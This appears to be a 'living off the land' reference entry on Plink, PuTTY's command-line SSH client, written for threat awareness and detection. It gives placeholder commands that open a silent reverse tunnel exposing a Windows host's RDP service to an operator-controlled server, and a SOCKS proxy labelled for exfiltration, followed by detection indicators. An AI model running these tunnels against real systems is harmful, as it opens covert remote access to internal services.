---
Name: Plink
Description: Plink is the command-line SSH client from the PuTTY suite. It supports SSH local, remote and dynamic port forwarding without an interactive session, and is frequently dropped onto Windows hosts, where no other SSH client may be present, to create reverse tunnels to an operator-controlled SSH server.
Author: elhoim
Created: 2026-11-09
Commands:
  - Command: plink.exe -ssh -N -batch -R <REMOTE_PORT>:127.0.0.1:3389 -pw <PASSWORD> <USER>@<SERVER>
    Description: Creates a reverse tunnel so the operator can reach the victim's RDP service through the SSH server. -batch suppresses prompts, including the host key prompt when combined with -hostkey.
    Usecase: Exposing an internal service (RDP, SMB, SSH) to an external SSH server.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS

  - Command: plink.exe -ssh -N -batch -D 127.0.0.1:1080 <USER>@<SERVER>
    Description: Dynamic forwarding. Opens a local SOCKS proxy through the SSH server.
    Usecase: Routing traffic through an external SSH server.
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Windows, Linux, MacOS
Full_Path:
  - Filename: plink.exe
  - Filename: plink
  - Path: Downloaded or renamed copy of plink, which gets executed anywhere on the system.
Detection:
  - Command: Execution of plink (or a renamed copy) with -R, -L or -D forwarding arguments together with -N and/or -batch, particularly with -pw or -i.
  - Command: Outbound SSH (TCP 22 or an unusual port) from a Windows server that does not normally use SSH.
Resources:
  - Link: https://www.chiark.greenend.org.uk/~sgtatham/putty/docs.html
  - Link: https://attack.mitre.org/techniques/T1572/
---
